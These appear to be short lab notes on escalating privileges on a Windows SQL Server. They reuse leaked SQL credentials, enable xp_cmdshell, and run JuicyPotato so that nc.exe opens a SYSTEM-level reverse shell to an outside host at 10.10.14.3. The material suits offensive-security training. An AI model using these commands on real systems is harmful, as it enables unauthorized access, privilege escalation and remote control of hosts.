# SeImpersonate Example - JuicyPotato

Gaining foothold on SQL Server using privileged SQL user.

- Achieve RCE using `xp_cmdshell` using creds from `logins.sql`
- Connect with MSSQLClient.py
```bash
mssqlclient.py sql_dev@10.129.43.30 -windows-auth
```

- Enabling xp_cmdshell
- `xp_cmdshell whoami /priv`
- Drop JuicyPotato.exe and nc.exe onto the target
```
xp_cmdshell c:\tools\Juicypotato.exe -l 53375 c:\windows\system32\cmd.exe 
    -a "/c c:\tools\nc.exe 10.10.14.3 -e cmd.exe" -t *
```

